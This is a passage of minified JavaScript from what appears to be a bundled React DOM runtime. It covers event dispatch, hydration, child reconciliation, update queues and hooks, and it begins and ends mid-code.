e;case"keydown":case"keyup":E=c3;break;case"focusin":C="focus",E=Ip;break;case"focusout":C="blur",E=Ip;break;case"beforeblur":case"afterblur":E=Ip;break;case"click":if(n.button===2)break e;case"auxclick":case"dblclick":case"mousedown":case"mousemove":case"mouseup":case"mouseout":case"mouseover":case"contextmenu":E=$y;break;case"drag":case"dragend":case"dragenter":case"dragexit":case"dragleave":case"dragover":case"dragstart":case"drop":E=ZA;break;case"touchcancel":case"touchend":case"touchmove":case"touchstart":E=h3;break;case DE:case LE:case _E:E=t3;break;case IE:E=m3;break;case"scroll":E=KA;break;case"wheel":E=x3;break;case"copy":case"cut":case"paste":E=r3;break;case"gotpointercapture":case"lostpointercapture":case"pointercancel":case"pointerdown":case"pointermove":case"pointerout":case"pointerover":case"pointerup":E=Vy}var P=(t&4)!==0,O=!P&&e==="scroll",N=P?b!==null?b+"Capture":null:b;P=[];for(var T=m,A;T!==null;){A=T;var _=A.stateNode;if(A.tag===5&&_!==null&&(A=_,N!==null&&(_=pu(T,N),_!=null&&P.push(Eu(T,_,A)))),O)break;T=T.return}0<P.length&&(b=new E(b,C,null,n,x),g.push({event:b,listeners:P}))}}if(!(t&7)){e:{if(b=e==="mouseover"||e==="pointerover",E=e==="mouseout"||e==="pointerout",b&&n!==Pm&&(C=n.relatedTarget||n.fromElement)&&(ts(C)||C[Ii]))break e;if((E||b)&&(b=x.window===x?x:(b=x.ownerDocument)?b.defaultView||b.parentWindow:window,E?(C=n.relatedTarget||n.toElement,E=m,C=C?ts(C):null,C!==null&&(O=vs(C),C!==O||C.tag!==5&&C.tag!==6)&&(C=null)):(E=null,C=m),E!==C)){if(P=$y,_="onMouseLeave",N="onMouseEnter",T="mouse",(e==="pointerout"||e==="pointerover")&&(P=Vy,_="onPointerLeave",N="onPointerEnter",T="pointer"),O=E==null?b:tl(E),A=C==null?b:tl(C),b=new P(_,T+"leave",E,n,x),b.target=O,b.relatedTarget=A,_=null,ts(x)===m&&(P=new P(N,T+"enter",C,n,x),P.target=A,P.relatedTarget=O,_=P),O=_,E&&C)t:{for(P=E,N=C,T=0,A=P;A;A=qs(A))T++;for(A=0,_=N;_;_=qs(_))A++;for(;0<T-A;)P=qs(P),T--;for(;0<A-T;)N=qs(N),A--;for(;T--;){if(P===N||N!==null&&P===N.alternate)break t;P=qs(P),N=qs(N)}P=null}else P=null;E!==null&&iv(g,b,E,P,!1),C!==null&&O!==null&&iv(g,O,C,P,!0)}}e:{if(b=m?tl(m):window,E=b.nodeName&&b.nodeName.toLowerCase(),E==="select"||E==="input"&&b.type==="file")var M=T3;else if(Ky(b))if(TE)M=A3;else{M=S3;var R=C3}else(E=b.nodeName)&&E.toLowerCase()==="input"&&(b.type==="checkbox"||b.type==="radio")&&(M=N3);if(M&&(M=M(e,m))){kE(g,M,n,x);break e}R&&R(e,b,m),e==="focusout"&&(R=b._wrapperState)&&R.controlled&&b.type==="number"&&Am(b,"number",b.value)}switch(R=m?tl(m):window,e){case"focusin":(Ky(R)||R.contentEditable==="true")&&(Js=R,Hm=m,Zo=null);break;case"focusout":Zo=Hm=Js=null;break;case"mousedown":Um=!0;break;case"contextmenu":case"mouseup":case"dragend":Um=!1,tv(g,n,x);break;case"selectionchange":if(_3)break;case"keydown":case"keyup":tv(g,n,x)}var B;if(sg)e:{switch(e){case"compositionstart":var U="onCompositionStart";break e;case"compositionend":U="onCompositionEnd";break e;case"compositionupdate":U="onCompositionUpdate";break e}U=void 0}else Zs?EE(e,n)&&(U="onCompositionEnd"):e==="keydown"&&n.keyCode===229&&(U="onCompositionStart");U&&(bE&&n.locale!=="ko"&&(Zs||U!=="onCompositionStart"?U==="onCompositionEnd"&&Zs&&(B=vE()):(pa=x,rg="value"in pa?pa.value:pa.textContent,Zs=!0)),R=zd(m,U),0<R.length&&(U=new Yy(U,e,null,n,x),g.push({event:U,listeners:R}),B?U.data=B:(B=wE(n),B!==null&&(U.data=B)))),(B=v3?b3(e,n):E3(e,n))&&(m=zd(m,"onBeforeInput"),0<m.length&&(x=new Yy("onBeforeInput","beforeinput",null,n,x),g.push({event:x,listeners:m}),x.data=B))}jE(g,t)})}function Eu(e,t,n){return{instance:e,listener:t,currentTarget:n}}function zd(e,t){for(var n=t+"Capture",r=[];e!==null;){var a=e,l=a.stateNode;a.tag===5&&l!==null&&(a=l,l=pu(e,n),l!=null&&r.unshift(Eu(e,l,a)),l=pu(e,t),l!=null&&r.push(Eu(e,l,a))),e=e.return}return r}function qs(e){if(e===null)return null;do e=e.return;while(e&&e.tag!==5);return e||null}function iv(e,t,n,r,a){for(var l=t._reactName,u=[];n!==null&&n!==r;){var f=n,h=f.alternate,m=f.stateNode;if(h!==null&&h===r)break;f.tag===5&&m!==null&&(f=m,a?(h=pu(n,l),h!=null&&u.unshift(Eu(n,h,f))):a||(h=pu(n,l),h!=null&&u.push(Eu(n,h,f)))),n=n.return}u.length!==0&&e.push({event:t,listeners:u})}var R3=/\r\n?/g,O3=/\u0000|\uFFFD/g;function av(e){return(typeof e=="string"?e:""+e).replace(R3,`
`).replace(O3,"")}function Zc(e,t,n){if(t=av(t),av(e)!==t&&n)throw Error(Se(425))}function Wd(){}var zm=null,Wm=null;function qm(e,t){return e==="textarea"||e==="noscript"||typeof t.children=="string"||typeof t.children=="number"||typeof t.dangerouslySetInnerHTML=="object"&&t.dangerouslySetInnerHTML!==null&&t.dangerouslySetInnerHTML.__html!=null}var $m=typeof setTimeout=="function"?setTimeout:void 0,F3=typeof clearTimeout=="function"?clearTimeout:void 0,sv=typeof Promise=="function"?Promise:void 0,M3=typeof queueMicrotask=="function"?queueMicrotask:typeof sv<"u"?function(e){return sv.resolve(null).then(e).catch(B3)}:$m;function B3(e){setTimeout(function(){throw e})}function Hp(e,t){var n=t,r=0;do{var a=n.nextSibling;if(e.removeChild(n),a&&a.nodeType===8)if(n=a.data,n==="/$"){if(r===0){e.removeChild(a),xu(t);return}r--}else n!=="$"&&n!=="$?"&&n!=="$!"||r++;n=a}while(n);xu(t)}function wa(e){for(;e!=null;e=e.nextSibling){var t=e.nodeType;if(t===1||t===3)break;if(t===8){if(t=e.data,t==="$"||t==="$!"||t==="$?")break;if(t==="/$")return null}}return e}function lv(e){e=e.previousSibling;for(var t=0;e;){if(e.nodeType===8){var n=e.data;if(n==="$"||n==="$!"||n==="$?"){if(t===0)return e;t--}else n==="/$"&&t++}e=e.previousSibling}return null}var jl=Math.random().toString(36).slice(2),ui="__reactFiber$"+jl,wu="__reactProps$"+jl,Ii="__reactContainer$"+jl,Ym="__reactEvents$"+jl,H3="__reactListeners$"+jl,U3="__reactHandles$"+jl;function ts(e){var t=e[ui];if(t)return t;for(var n=e.parentNode;n;){if(t=n[Ii]||n[ui]){if(n=t.alternate,t.child!==null||n!==null&&n.child!==null)for(e=lv(e);e!==null;){if(n=e[ui])return n;e=lv(e)}return t}e=n,n=e.parentNode}return null}function qu(e){return e=e[ui]||e[Ii],!e||e.tag!==5&&e.tag!==6&&e.tag!==13&&e.tag!==3?null:e}function tl(e){if(e.tag===5||e.tag===6)return e.stateNode;throw Error(Se(33))}function Sf(e){return e[wu]||null}var Vm=[],nl=-1;function _a(e){return{current:e}}function Ft(e){0>nl||(e.current=Vm[nl],Vm[nl]=null,nl--)}function It(e,t){nl++,Vm[nl]=e.current,e.current=t}var Aa={},Fn=_a(Aa),lr=_a(!1),us=Aa;function El(e,t){var n=e.type.contextTypes;if(!n)return Aa;var r=e.stateNode;if(r&&r.__reactInternalMemoizedUnmaskedChildContext===t)return r.__reactInternalMemoizedMaskedChildContext;var a={},l;for(l in n)a[l]=t[l];return r&&(e=e.stateNode,e.__reactInternalMemoizedUnmaskedChildContext=t,e.__reactInternalMemoizedMaskedChildContext=a),a}function or(e){return e=e.childContextTypes,e!=null}function qd(){Ft(lr),Ft(Fn)}function ov(e,t,n){if(Fn.current!==Aa)throw Error(Se(168));It(Fn,t),It(lr,n)}function OE(e,t,n){var r=e.stateNode;if(t=t.childContextTypes,typeof r.getChildContext!="function")return n;r=r.getChildContext();for(var a in r)if(!(a in t))throw Error(Se(108,CA(e)||"Unknown",a));return Vt({},n,r)}function $d(e){return e=(e=e.stateNode)&&e.__reactInternalMemoizedMergedChildContext||Aa,us=Fn.current,It(Fn,e),It(lr,lr.current),!0}function uv(e,t,n){var r=e.stateNode;if(!r)throw Error(Se(169));n?(e=OE(e,t,us),r.__reactInternalMemoizedMergedChildContext=e,Ft(lr),Ft(Fn),It(Fn,e)):Ft(lr),It(lr,n)}var Ci=null,Nf=!1,Up=!1;function FE(e){Ci===null?Ci=[e]:Ci.push(e)}function z3(e){Nf=!0,FE(e)}function Ia(){if(!Up&&Ci!==null){Up=!0;var e=0,t=St;try{var n=Ci;for(St=1;e<n.length;e++){var r=n[e];do r=r(!0);while(r!==null)}Ci=null,Nf=!1}catch(a){throw Ci!==null&&(Ci=Ci.slice(e+1)),oE(J0,Ia),a}finally{St=t,Up=!1}}return null}var rl=[],il=0,Yd=null,Vd=0,Sr=[],Nr=0,cs=null,Ni=1,Ai="";function Xa(e,t){rl[il++]=Vd,rl[il++]=Yd,Yd=e,Vd=t}function ME(e,t,n){Sr[Nr++]=Ni,Sr[Nr++]=Ai,Sr[Nr++]=cs,cs=e;var r=Ni;e=Ai;var a=32-Vr(r)-1;r&=~(1<<a),n+=1;var l=32-Vr(t)+a;if(30<l){var u=a-a%5;l=(r&(1<<u)-1).toString(32),r>>=u,a-=u,Ni=1<<32-Vr(t)+a|n<<a|r,Ai=l+e}else Ni=1<<l|n<<a|r,Ai=e}function og(e){e.return!==null&&(Xa(e,1),ME(e,1,0))}function ug(e){for(;e===Yd;)Yd=rl[--il],rl[il]=null,Vd=rl[--il],rl[il]=null;for(;e===cs;)cs=Sr[--Nr],Sr[Nr]=null,Ai=Sr[--Nr],Sr[Nr]=null,Ni=Sr[--Nr],Sr[Nr]=null}var yr=null,xr=null,zt=!1,Yr=null;function BE(e,t){var n=Lr(5,null,null,0);n.elementType="DELETED",n.stateNode=t,n.return=e,t=e.deletions,t===null?(e.deletions=[n],e.flags|=16):t.push(n)}function cv(e,t){switch(e.tag){case 5:var n=e.type;return t=t.nodeType!==1||n.toLowerCase()!==t.nodeName.toLowerCase()?null:t,t!==null?(e.stateNode=t,yr=e,xr=wa(t.firstChild),!0):!1;case 6:return t=e.pendingProps===""||t.nodeType!==3?null:t,t!==null?(e.stateNode=t,yr=e,xr=null,!0):!1;case 13:return t=t.nodeType!==8?null:t,t!==null?(n=cs!==null?{id:Ni,overflow:Ai}:null,e.memoizedState={dehydrated:t,treeContext:n,retryLane:1073741824},n=Lr(18,null,null,0),n.stateNode=t,n.return=e,e.child=n,yr=e,xr=null,!0):!1;default:return!1}}function Gm(e){return(e.mode&1)!==0&&(e.flags&128)===0}function Qm(e){if(zt){var t=xr;if(t){var n=t;if(!cv(e,t)){if(Gm(e))throw Error(Se(418));t=wa(n.nextSibling);var r=yr;t&&cv(e,t)?BE(r,n):(e.flags=e.flags&-4097|2,zt=!1,yr=e)}}else{if(Gm(e))throw Error(Se(418));e.flags=e.flags&-4097|2,zt=!1,yr=e}}}function dv(e){for(e=e.return;e!==null&&e.tag!==5&&e.tag!==3&&e.tag!==13;)e=e.return;yr=e}function Jc(e){if(e!==yr)return!1;if(!zt)return dv(e),zt=!0,!1;var t;if((t=e.tag!==3)&&!(t=e.tag!==5)&&(t=e.type,t=t!=="head"&&t!=="body"&&!qm(e.type,e.memoizedProps)),t&&(t=xr)){if(Gm(e))throw HE(),Error(Se(418));for(;t;)BE(e,t),t=wa(t.nextSibling)}if(dv(e),e.tag===13){if(e=e.memoizedState,e=e!==null?e.dehydrated:null,!e)throw Error(Se(317));e:{for(e=e.nextSibling,t=0;e;){if(e.nodeType===8){var n=e.data;if(n==="/$"){if(t===0){xr=wa(e.nextSibling);break e}t--}else n!=="$"&&n!=="$!"&&n!=="$?"||t++}e=e.nextSibling}xr=null}}else xr=yr?wa(e.stateNode.nextSibling):null;return!0}function HE(){for(var e=xr;e;)e=wa(e.nextSibling)}function wl(){xr=yr=null,zt=!1}function cg(e){Yr===null?Yr=[e]:Yr.push(e)}var W3=Hi.ReactCurrentBatchConfig;function Do(e,t,n){if(e=n.ref,e!==null&&typeof e!="function"&&typeof e!="object"){if(n._owner){if(n=n._owner,n){if(n.tag!==1)throw Error(Se(309));var r=n.stateNode}if(!r)throw Error(Se(147,e));var a=r,l=""+e;return t!==null&&t.ref!==null&&typeof t.ref=="function"&&t.ref._stringRef===l?t.ref:(t=function(u){var f=a.refs;u===null?delete f[l]:f[l]=u},t._stringRef=l,t)}if(typeof e!="string")throw Error(Se(284));if(!n._owner)throw Error(Se(290,e))}return e}function ed(e,t){throw e=Object.prototype.toString.call(t),Error(Se(31,e==="[object Object]"?"object with keys {"+Object.keys(t).join(", ")+"}":e))}function fv(e){var t=e._init;return t(e._payload)}function UE(e){function t(N,T){if(e){var A=N.deletions;A===null?(N.deletions=[T],N.flags|=16):A.push(T)}}function n(N,T){if(!e)return null;for(;T!==null;)t(N,T),T=T.sibling;return null}function r(N,T){for(N=new Map;T!==null;)T.key!==null?N.set(T.key,T):N.set(T.index,T),T=T.sibling;return N}function a(N,T){return N=Sa(N,T),N.index=0,N.sibling=null,N}function l(N,T,A){return N.index=A,e?(A=N.alternate,A!==null?(A=A.index,A<T?(N.flags|=2,T):A):(N.flags|=2,T)):(N.flags|=1048576,T)}function u(N){return e&&N.alternate===null&&(N.flags|=2),N}function f(N,T,A,_){return T===null||T.tag!==6?(T=Gp(A,N.mode,_),T.return=N,T):(T=a(T,A),T.return=N,T)}function h(N,T,A,_){var M=A.type;return M===Xs?x(N,T,A.props.children,_,A.key):T!==null&&(T.elementType===M||typeof M=="object"&&M!==null&&M.$$typeof===ua&&fv(M)===T.type)?(_=a(T,A.props),_.ref=Do(N,T,A),_.return=N,_):(_=Sd(A.type,A.key,A.props,null,N.mode,_),_.ref=Do(N,T,A),_.return=N,_)}function m(N,T,A,_){return T===null||T.tag!==4||T.stateNode.containerInfo!==A.containerInfo||T.stateNode.implementation!==A.implementation?(T=Qp(A,N.mode,_),T.return=N,T):(T=a(T,A.children||[]),T.return=N,T)}function x(N,T,A,_,M){return T===null||T.tag!==7?(T=ss(A,N.mode,_,M),T.return=N,T):(T=a(T,A),T.return=N,T)}function g(N,T,A){if(typeof T=="string"&&T!==""||typeof T=="number")return T=Gp(""+T,N.mode,A),T.return=N,T;if(typeof T=="object"&&T!==null){switch(T.$$typeof){case Wc:return A=Sd(T.type,T.key,T.props,null,N.mode,A),A.ref=Do(N,null,T),A.return=N,A;case Ks:return T=Qp(T,N.mode,A),T.return=N,T;case ua:var _=T._init;return g(N,_(T._payload),A)}if(Wo(T)||To(T))return T=ss(T,N.mode,A,null),T.return=N,T;ed(N,T)}return null}function b(N,T,A,_){var M=T!==null?T.key:null;if(typeof A=="string"&&A!==""||typeof A=="number")return M!==null?null:f(N,T,""+A,_);if(typeof A=="object"&&A!==null){switch(A.$$typeof){case Wc:return A.key===M?h(N,T,A,_):null;case Ks:return A.key===M?m(N,T,A,_):null;case ua:return M=A._init,b(N,T,M(A._payload),_)}if(Wo(A)||To(A))return M!==null?null:x(N,T,A,_,null);ed(N,A)}return null}function E(N,T,A,_,M){if(typeof _=="string"&&_!==""||typeof _=="number")return N=N.get(A)||null,f(T,N,""+_,M);if(typeof _=="object"&&_!==null){switch(_.$$typeof){case Wc:return N=N.get(_.key===null?A:_.key)||null,h(T,N,_,M);case Ks:return N=N.get(_.key===null?A:_.key)||null,m(T,N,_,M);case ua:var R=_._init;return E(N,T,A,R(_._payload),M)}if(Wo(_)||To(_))return N=N.get(A)||null,x(T,N,_,M,null);ed(T,_)}return null}function C(N,T,A,_){for(var M=null,R=null,B=T,U=T=0,$=null;B!==null&&U<A.length;U++){B.index>U?($=B,B=null):$=B.sibling;var Y=b(N,B,A[U],_);if(Y===null){B===null&&(B=$);break}e&&B&&Y.alternate===null&&t(N,B),T=l(Y,T,U),R===null?M=Y:R.sibling=Y,R=Y,B=$}if(U===A.length)return n(N,B),zt&&Xa(N,U),M;if(B===null){for(;U<A.length;U++)B=g(N,A[U],_),B!==null&&(T=l(B,T,U),R===null?M=B:R.sibling=B,R=B);return zt&&Xa(N,U),M}for(B=r(N,B);U<A.length;U++)$=E(B,N,U,A[U],_),$!==null&&(e&&$.alternate!==null&&B.delete($.key===null?U:$.key),T=l($,T,U),R===null?M=$:R.sibling=$,R=$);return e&&B.forEach(function(ne){return t(N,ne)}),zt&&Xa(N,U),M}function P(N,T,A,_){var M=To(A);if(typeof M!="function")throw Error(Se(150));if(A=M.call(A),A==null)throw Error(Se(151));for(var R=M=null,B=T,U=T=0,$=null,Y=A.next();B!==null&&!Y.done;U++,Y=A.next()){B.index>U?($=B,B=null):$=B.sibling;var ne=b(N,B,Y.value,_);if(ne===null){B===null&&(B=$);break}e&&B&&ne.alternate===null&&t(N,B),T=l(ne,T,U),R===null?M=ne:R.sibling=ne,R=ne,B=$}if(Y.done)return n(N,B),zt&&Xa(N,U),M;if(B===null){for(;!Y.done;U++,Y=A.next())Y=g(N,Y.value,_),Y!==null&&(T=l(Y,T,U),R===null?M=Y:R.sibling=Y,R=Y);return zt&&Xa(N,U),M}for(B=r(N,B);!Y.done;U++,Y=A.next())Y=E(B,N,U,Y.value,_),Y!==null&&(e&&Y.alternate!==null&&B.delete(Y.key===null?U:Y.key),T=l(Y,T,U),R===null?M=Y:R.sibling=Y,R=Y);return e&&B.forEach(function(Z){return t(N,Z)}),zt&&Xa(N,U),M}function O(N,T,A,_){if(typeof A=="object"&&A!==null&&A.type===Xs&&A.key===null&&(A=A.props.children),typeof A=="object"&&A!==null){switch(A.$$typeof){case Wc:e:{for(var M=A.key,R=T;R!==null;){if(R.key===M){if(M=A.type,M===Xs){if(R.tag===7){n(N,R.sibling),T=a(R,A.props.children),T.return=N,N=T;break e}}else if(R.elementType===M||typeof M=="object"&&M!==null&&M.$$typeof===ua&&fv(M)===R.type){n(N,R.sibling),T=a(R,A.props),T.ref=Do(N,R,A),T.return=N,N=T;break e}n(N,R);break}else t(N,R);R=R.sibling}A.type===Xs?(T=ss(A.props.children,N.mode,_,A.key),T.return=N,N=T):(_=Sd(A.type,A.key,A.props,null,N.mode,_),_.ref=Do(N,T,A),_.return=N,N=_)}return u(N);case Ks:e:{for(R=A.key;T!==null;){if(T.key===R)if(T.tag===4&&T.stateNode.containerInfo===A.containerInfo&&T.stateNode.implementation===A.implementation){n(N,T.sibling),T=a(T,A.children||[]),T.return=N,N=T;break e}else{n(N,T);break}else t(N,T);T=T.sibling}T=Qp(A,N.mode,_),T.return=N,N=T}return u(N);case ua:return R=A._init,O(N,T,R(A._payload),_)}if(Wo(A))return C(N,T,A,_);if(To(A))return P(N,T,A,_);ed(N,A)}return typeof A=="string"&&A!==""||typeof A=="number"?(A=""+A,T!==null&&T.tag===6?(n(N,T.sibling),T=a(T,A),T.return=N,N=T):(n(N,T),T=Gp(A,N.mode,_),T.return=N,N=T),u(N)):n(N,T)}return O}var kl=UE(!0),zE=UE(!1),Gd=_a(null),Qd=null,al=null,dg=null;function fg(){dg=al=Qd=null}function hg(e){var t=Gd.current;Ft(Gd),e._currentValue=t}function Km(e,t,n){for(;e!==null;){var r=e.alternate;if((e.childLanes&t)!==t?(e.childLanes|=t,r!==null&&(r.childLanes|=t)):r!==null&&(r.childLanes&t)!==t&&(r.childLanes|=t),e===n)break;e=e.return}}function hl(e,t){Qd=e,dg=al=null,e=e.dependencies,e!==null&&e.firstContext!==null&&(e.lanes&t&&(sr=!0),e.firstContext=null)}function Ir(e){var t=e._currentValue;if(dg!==e)if(e={context:e,memoizedValue:t,next:null},al===null){if(Qd===null)throw Error(Se(308));al=e,Qd.dependencies={lanes:0,firstContext:e}}else al=al.next=e;return t}var ns=null;function pg(e){ns===null?ns=[e]:ns.push(e)}function WE(e,t,n,r){var a=t.interleaved;return a===null?(n.next=n,pg(t)):(n.next=a.next,a.next=n),t.interleaved=n,Pi(e,r)}function Pi(e,t){e.lanes|=t;var n=e.alternate;for(n!==null&&(n.lanes|=t),n=e,e=e.return;e!==null;)e.childLanes|=t,n=e.alternate,n!==null&&(n.childLanes|=t),n=e,e=e.return;return n.tag===3?n.stateNode:null}var ca=!1;function mg(e){e.updateQueue={baseState:e.memoizedState,firstBaseUpdate:null,lastBaseUpdate:null,shared:{pending:null,interleaved:null,lanes:0},effects:null}}function qE(e,t){e=e.updateQueue,t.updateQueue===e&&(t.updateQueue={baseState:e.baseState,firstBaseUpdate:e.firstBaseUpdate,lastBaseUpdate:e.lastBaseUpdate,shared:e.shared,effects:e.effects})}function Di(e,t){return{eventTime:e,lane:t,tag:0,payload:null,callback:null,next:null}}function ka(e,t,n){var r=e.updateQueue;if(r===null)return null;if(r=r.shared,mt&2){var a=r.pending;return a===null?t.next=t:(t.next=a.next,a.next=t),r.pending=t,Pi(e,n)}return a=r.interleaved,a===null?(t.next=t,pg(r)):(t.next=a.next,a.next=t),r.interleaved=t,Pi(e,n)}function bd(e,t,n){if(t=t.updateQueue,t!==null&&(t=t.shared,(n&4194240)!==0)){var r=t.lanes;r&=e.pendingLanes,n|=r,t.lanes=n,eg(e,n)}}function hv(e,t){var n=e.updateQueue,r=e.alternate;if(r!==null&&(r=r.updateQueue,n===r)){var a=null,l=null;if(n=n.firstBaseUpdate,n!==null){do{var u={eventTime:n.eventTime,lane:n.lane,tag:n.tag,payload:n.payload,callback:n.callback,next:null};l===null?a=l=u:l=l.next=u,n=n.next}while(n!==null);l===null?a=l=t:l=l.next=t}else a=l=t;n={baseState:r.baseState,firstBaseUpdate:a,lastBaseUpdate:l,shared:r.shared,effects:r.effects},e.updateQueue=n;return}e=n.lastBaseUpdate,e===null?n.firstBaseUpdate=t:e.next=t,n.lastBaseUpdate=t}function Kd(e,t,n,r){var a=e.updateQueue;ca=!1;var l=a.firstBaseUpdate,u=a.lastBaseUpdate,f=a.shared.pending;if(f!==null){a.shared.pending=null;var h=f,m=h.next;h.next=null,u===null?l=m:u.next=m,u=h;var x=e.alternate;x!==null&&(x=x.updateQueue,f=x.lastBaseUpdate,f!==u&&(f===null?x.firstBaseUpdate=m:f.next=m,x.lastBaseUpdate=h))}if(l!==null){var g=a.baseState;u=0,x=m=h=null,f=l;do{var b=f.lane,E=f.eventTime;if((r&b)===b){x!==null&&(x=x.next={eventTime:E,lane:0,tag:f.tag,payload:f.payload,callback:f.callback,next:null});e:{var C=e,P=f;switch(b=t,E=n,P.tag){case 1:if(C=P.payload,typeof C=="function"){g=C.call(E,g,b);break e}g=C;break e;case 3:C.flags=C.flags&-65537|128;case 0:if(C=P.payload,b=typeof C=="function"?C.call(E,g,b):C,b==null)break e;g=Vt({},g,b);break e;case 2:ca=!0}}f.callback!==null&&f.lane!==0&&(e.flags|=64,b=a.effects,b===null?a.effects=[f]:b.push(f))}else E={eventTime:E,lane:b,tag:f.tag,payload:f.payload,callback:f.callback,next:null},x===null?(m=x=E,h=g):x=x.next=E,u|=b;if(f=f.next,f===null){if(f=a.shared.pending,f===null)break;b=f,f=b.next,b.next=null,a.lastBaseUpdate=b,a.shared.pending=null}}while(!0);if(x===null&&(h=g),a.baseState=h,a.firstBaseUpdate=m,a.lastBaseUpdate=x,t=a.shared.interleaved,t!==null){a=t;do u|=a.lane,a=a.next;while(a!==t)}else l===null&&(a.shared.lanes=0);fs|=u,e.lanes=u,e.memoizedState=g}}function pv(e,t,n){if(e=t.effects,t.effects=null,e!==null)for(t=0;t<e.length;t++){var r=e[t],a=r.callback;if(a!==null){if(r.callback=null,r=n,typeof a!="function")throw Error(Se(191,a));a.call(r)}}}var $u={},di=_a($u),ku=_a($u),Tu=_a($u);function rs(e){if(e===$u)throw Error(Se(174));return e}function gg(e,t){switch(It(Tu,t),It(ku,e),It(di,$u),e=t.nodeType,e){case 9:case 11:t=(t=t.documentElement)?t.namespaceURI:Lm(null,"");break;default:e=e===8?t.parentNode:t,t=e.namespaceURI||null,e=e.tagName,t=Lm(t,e)}Ft(di),It(di,t)}function Tl(){Ft(di),Ft(ku),Ft(Tu)}function $E(e){rs(Tu.current);var t=rs(di.current),n=Lm(t,e.type);t!==n&&(It(ku,e),It(di,n))}function xg(e){ku.current===e&&(Ft(di),Ft(ku))}var $t=_a(0);function Xd(e){for(var t=e;t!==null;){if(t.tag===13){var n=t.memoizedState;if(n!==null&&(n=n.dehydrated,n===null||n.data==="$?"||n.data==="$!"))return t}else if(t.tag===19&&t.memoizedProps.revealOrder!==void 0){if(t.flags&128)return t}else if(t.child!==null){t.child.return=t,t=t.child;continue}if(t===e)break;for(;t.sibling===null;){if(t.return===null||t.return===e)return null;t=t.return}t.sibling.return=t.return,t=t.sibling}return null}var zp=[];function yg(){for(var e=0;e<zp.length;e++)zp[e]._workInProgressVersionPrimary=null;zp.length=0}var Ed=Hi.ReactCurrentDispatcher,Wp=Hi.ReactCurrentBatchConfig,ds=0,Yt=null,pn=null,bn=null,Zd=!1,Jo=!1,Cu=0,q3=0;function Pn(){throw Error(Se(321))}function vg(e,t){if(t===null)return!1;for(var n=0;n<t.length&&n<e.length;n++)if(!Kr(e[n],t[n]))return!1;return!0}function bg(e,t,n,r,a,l){if(ds=l,Yt=t,t.memoizedState=null,t.updateQueue=null,t.lanes=0,Ed.current=e===null||e.memoizedState===null?G3:Q3,e=n(r,a),Jo){l=0;do{if(Jo=!1,Cu=0,25<=l)throw Error(Se(301));l+=1,bn=pn=null,t.updateQueue=null,Ed.current=K3,e=n(r,a)}while(Jo)}if(Ed.current=Jd,t=pn!==null&&pn.next!==null,ds=0,bn=pn=Yt=null,Zd=!1,t)throw Error(Se(300));return e}function Eg(){var e=Cu!==0;return Cu=0,e}function si(){var e={memoizedState:null,baseState:null,baseQueue:null,queue:null,next:null};return bn===null?Yt.memoizedState=bn=e:bn=bn.next=e,bn}function Pr(){if(pn===null){var e=Yt.alternate;e=e!==null?e.memoizedState:null}else e=pn.next;var t=bn===null?Yt.memoizedState:bn.next;if(t!==null)bn=t,pn=e;else{if(e===null)throw Error(Se(310));pn=e,e={memoizedState:pn.memoizedState,baseState:pn.baseState,baseQueue:pn.baseQueue,queue:pn.queue,next:null},bn===null?Yt.memoizedState=bn=e:bn=bn.next=e}return bn}function Su(e,t){return typeof t=="function"?t(e):t}function qp(e){var t=Pr(),n=t.queue;if(n===null)throw Error(Se(311));n.lastRenderedReducer=e;var r=pn,a=r.baseQueue,l=n.pending;if(l!==null){if(a!==null){var u=a.next;a.next=l.next,l.next=u}r.baseQueue=a=l,n.pending=null}if(a!==null){l=a.next,r=r.baseState;var f=u=null,h=null,m=l;do{var x=m.lane;if((ds&x)===x)h!==null&&(h=h.next={lane:0,action:m.action,hasEagerState:m.hasEagerState,eagerState:m.eagerState,next:null}),r=m.hasEagerState?m.eagerState:e(r,m.action);else{var g={lane:x,action:m.action,hasEagerState:m.hasEagerState,eagerState:m.eagerState,next:null};h===null?(f=h=g,u=r):h=h.next=g,Yt.lanes|=x,fs|=x}m=m.next}while(m!==null&&m!==l);h===null?u=r:h.next=f,Kr(r,t.memoizedState)||(sr=!0),t.memoizedState=r,t.baseState=u,t.baseQueue=h,n.lastRenderedState=r}if(e=n.interleaved,e!==null){a=e;do l=a.lane,Yt.lanes|=l,fs|=l,a=a.next;while(a!==e)}else a===null&&(n.lanes=0);return[t.memoizedState,n.dispatch]}function $p(e){var t=Pr(),n=t.queue;if(n===null)throw Error(Se(311));n.lastRenderedReducer=e;var r=n.dispatch,a=n.pending,l=t.memoizedState;if(a!==null){n.pending=null;var u=a=a.next;do l=e(l,u.action),u=u.next;while(u!==a);Kr(l,t.memoizedState)||(sr=!0),t.memoizedState=l,t.baseQueue===null&&(t.baseState=l),n.lastRenderedState=l}return[l,r]}function YE(){}function VE(e,t){var n=Yt,r=Pr(),a=t(),l=!Kr(r.memoizedState,a);if(l&&(r.memoizedState=a,sr=!0),r=r.queue,wg(KE.bind(null,n,r,e),[e]),r.getSnapshot!==t||l||bn!==null&&bn.memoizedState.tag&1){if(n.flags|=2048,Nu(9,QE.bind(null,n,r,a,t),void 0,null),wn===null)throw Error(Se(349));ds&30||GE(n,t,a)}return a}function GE(e,t,n){e.flags|=16384,e={getSnapshot:t,value:n},t=Yt.updateQueue,t===null?(t={lastEffect:null,stores:null},Yt.updateQueue=t,t.stores=[e]):(n=t.stores,n===null?t.stores=[e]:n.push(e))}function QE(e,t,n,r){t.value=n,t.getSnapshot=r,XE(t)&&ZE(e)}function KE(e,t,n){return n(function(){XE(t)&&ZE(e)})}function XE(e){var t=e.getSnapshot;e=e.value;try{var n=t();return!Kr(e,n)}catch{return!0}}function ZE(e){var t=Pi(e,1);t!==null&&Gr(t,e,1,-1)}function mv(e){var t=si();return typeof e=="function"&&(e=e()),t.memoizedState=t.baseState=e,e={pending:null,interleaved:null,lanes:0,dispatch:null,lastRenderedReducer:Su,lastRenderedState:e},t.queue=e,e=e.dispatch=V3.bind(null,Yt,e),[t.memoizedState,e]}function Nu(e,t,n,r){return e={tag:e,create:t,destroy:n,deps:r,next:null},t=Yt.updateQueue,t===null?(t={lastEffect:null,stores:null},Yt.updateQueue=t,t.lastEffect=e.next=e):(n=t.lastEffect,n===null?t.lastEffect=e.next=e:(r=n.next,n.next=e,e.next=r,t.lastEffect=e)),e}function JE(){return Pr().memoizedState}function wd(e,t,n,r){var a=si();Yt.flags|=e,a.memoizedState=Nu(1|t,n,void 0,r===void 0?null:r)}function Af(e,t,n,r){var a=Pr();r=r===void 0?null:r;var l=void 0;if(pn!==null){var 